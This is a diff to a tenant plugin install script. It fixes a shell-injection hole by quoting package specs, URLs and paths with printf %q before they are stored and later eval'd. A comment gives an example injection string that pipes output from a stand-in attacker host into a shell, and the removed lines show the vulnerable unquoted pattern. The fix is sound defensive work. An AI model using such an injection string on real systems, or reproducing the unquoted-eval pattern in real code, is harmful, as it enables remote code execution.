@@ -40,6 +40,30 @@ usage() {
 log()  { echo "[tenant-install] $1"; }
 fail() { echo "[tenant-install] ERROR: $1" >&2; exit 1; }
 
+# install_cmd is stored in the manifest and later fed straight to `eval` by
+# reconcile-plugins.sh on every container start. The original install call
+# below (`uv pip install ... "$PACKAGE"`) is already safely quoted, so a
+# malicious PACKAGE spec can't break out THAT command — but install_cmd was
+# previously built by interpolating $PACKAGE/$URL/$DEST UNQUOTED into a
+# plain string for storage, and that string is what gets eval'd later. A
+# spec like "pypdf; curl evil.example | sh" would pass the original quoted
+# install call as one (failing) argument, then execute as two separate
+# shell commands the next time reconcile-plugins.sh evals the stored
+# string. The pre-existing double-quote/newline check in record_manifest
+# does not catch this — it only protects the YAML manifest's own quoting,
+# not eval's.
+#
+# Fixed by shell-quoting each tenant-supplied value with `printf %q` before
+# it goes into install_cmd, rather than denylisting characters: a denylist
+# broad enough to block ';', '|', '`', '$()', '<', '>' etc. also blocks
+# legitimate pip version-constraint syntax (e.g. "pkg>=1.0,<2.0" needs '<'
+# and '>'), so the fix has to be "make eval treat this as one opaque
+# argument" rather than "forbid the characters real specs need." %q
+# produces a token that reproduces the exact original string when the
+# shell re-parses it — including any of the characters above — so eval
+# can no longer interpret them as shell syntax.
+shq() { printf '%q' "$1"; }
+
 abi_tag() {
   # Captures the interpreter ABI so reconcile-plugins.sh can tell a
   # pip-installed package is stale after an image/interpreter upgrade,
@@ -76,13 +100,19 @@ case "$KIND" in
     [ "$#" -eq 3 ] || usage
     PACKAGE="$2"
     REASON="$3"
+    [ -n "$PACKAGE" ] || fail "package spec cannot be empty"
     mkdir -p "$LAZY_TARGET"
-    # No embedded double-quotes here deliberately: this string is stored as a
-    # double-quoted YAML scalar in the manifest (see record_manifest below),
-    # and paths on this platform are always fixed, space-free strings, so
-    # quoting isn't needed and would only make the manifest harder to parse
-    # back out correctly.
-    INSTALL_CMD="uv pip install --target $LAZY_TARGET --no-cache-dir $PACKAGE"
+    # $PACKAGE is quoted via shq() (printf %q) rather than interpolated raw:
+    # this string is stored in the manifest and eval'd verbatim by
+    # reconcile-plugins.sh later, so any shell-special characters in a
+    # package spec (';', '|', '$()', etc.) must survive as literal
+    # characters at eval time, not be re-interpreted as shell syntax — see
+    # the comment above shq()'s definition for why a character denylist
+    # isn't the right fix here (it would also reject legitimate version
+    # constraints like "pkg>=1.0,<2.0"). No embedded double-quotes from the
+    # quoting itself: %q wraps in single quotes, so the record_manifest
+    # double-quote check below still passes for ordinary specs.
+    INSTALL_CMD="uv pip install --target $(shq "$LAZY_TARGET") --no-cache-dir $(shq "$PACKAGE")"
     log "Installing pip package '$PACKAGE' into $LAZY_TARGET"
     uv pip install --target "$LAZY_TARGET" --no-cache-dir "$PACKAGE" \
       || fail "pip install of '$PACKAGE' failed"
@@ -93,6 +123,8 @@ case "$KIND" in
     NAME="$2"
     URL="$3"
     REASON="$4"
+    [ -n "$NAME" ] || fail "binary name cannot be empty"
+    [ -n "$URL" ]  || fail "download URL cannot be empty"
     case "$NAME" in
       */*) fail "binary name must not contain '/' (got '$NAME') — this installs a single file directly into $BIN_TARGET, not an arbitrary path" ;;
     esac
@@ -101,9 +133,9 @@ case "$KIND" in
       "$FORBIDDEN_PREFIX"*) fail "refusing to install into $FORBIDDEN_PREFIX — that runtime venv is off-limits, see comment at top of this script" ;;
     esac
     mkdir -p "$BIN_TARGET"
-    # See note above: no embedded double-quotes, kept parseable back out of
-    # the YAML manifest without an escaping scheme.
-    INSTALL_CMD="curl -sSL $URL -o $DEST && chmod +x $DEST"
+    # $URL and $DEST quoted via shq() for the same reason as $PACKAGE above:
+    # this string is eval'd later, not just parsed once here.
+    INSTALL_CMD="curl -sSL $(shq "$URL") -o $(shq "$DEST") && chmod +x $(shq "$DEST")"
     log "Installing binary '$NAME' to $DEST"
     curl -sSL "$URL" -o "$DEST" || fail "download of '$NAME' from $URL failed"
     chmod +x "$DEST"
